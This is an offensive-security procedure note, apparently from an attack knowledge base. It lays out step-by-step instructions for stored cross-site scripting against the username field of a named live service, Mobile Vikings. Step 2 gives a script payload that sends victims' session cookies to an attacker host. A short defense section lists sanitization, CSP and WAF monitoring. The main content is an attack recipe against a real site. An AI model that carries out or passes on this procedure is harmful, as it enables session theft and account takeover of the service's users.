---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.744Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0fe5173c-2d4a-45e6-8d2d-65fae6187cb8
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Username

## Summary

This procedure injects a malicious JavaScript payload into the username field of the Mobile Vikings web application, exploiting the lack of input sanitization to store the XSS for later reflection to victims.

## Description

In the Mobile Vikings application, the username field allows arbitrary input without proper escaping or validation. An attacker logs in, navigates to account settings, and sets their username to include a script tag like `<script>alert(1)</script>`. This payload is stored in the backend and later reflected unsanitized in victim-facing pages, enabling stored XSS. Prerequisites include an active attacker account; expected outcomes are payload storage confirmed by profile view, setting up execution during victim interactions.

## Requirements

1. Active attacker account on Mobile Vikings
2. Web browser access to https://mobilevikings.com
3. Knowledge of basic XSS payloads (e.g., `<script>alert(1)</script>`)

## Defense

Defensive measures and detection strategies:

- Implement server-side input sanitization and output encoding for usernames (e.g., using HTML entity encoding)
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for unusual username changes or JavaScript in user inputs via WAF logs

## Objectives

1. Store malicious payload in username field
2. Verify storage without immediate execution
3. Prepare for reflection in authorization contexts

## Instructions

### Step 1: Log In and Access Account Settings

**Context**: Authenticate as the attacker to reach editable profile fields.

Navigate to https://mobilevikings.com and log in with attacker credentials. Then, go to the account settings or profile edit page.

### Step 2: Update Username with Payload

**Context**: Inject the XSS payload directly into the username input.

Enter the username as `name<script>alert(1)</script>` (or a more advanced payload like `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` for exfiltration) and submit the form.

> The form submits without validation, storing the raw HTML/script in the database.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored by viewing the profile.

Refresh the profile page; the username should display with the script tag visible in source (but not executing yet, as it's not reflected in a script context).

**Expected Output**: Username appears altered in the UI; inspect element shows raw `<script>` tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
